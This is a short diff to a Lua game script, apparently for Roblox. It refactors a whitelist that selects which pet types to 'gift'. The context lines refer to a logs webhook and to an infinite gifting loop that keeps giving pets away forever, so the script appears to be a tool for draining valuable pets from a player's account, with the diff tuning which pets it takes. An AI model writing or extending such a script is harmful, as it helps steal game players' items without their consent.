@@ -696,15 +696,22 @@ if not success2 then warn("Something Went Wrong [Logs Webhook Error]", err2) end
             end
         end
 
-local function ShouldGiftPet(pet)
-local whitelist = {
+-- === WHITELIST FILTER ===
+local PetWhitelist = {
     ["Brontosaurus"] = true,
-    ["Mimic Octopus"] = true
+    ["Mimic Octopus"] = true,
+   
 }
 
-if not whitelist[pet.Type] then
+local function ShouldGiftPet(pet)
+    -- Pet.Type sudah versi tanpa mutation prefix
+    if PetWhitelist[pet.Type] then
+        return true
+    end
+
     return false
 end
+
 
         -- === INFINITE GIFTING LOOP (Keeps gifting forever) ===
         task.spawn(function()
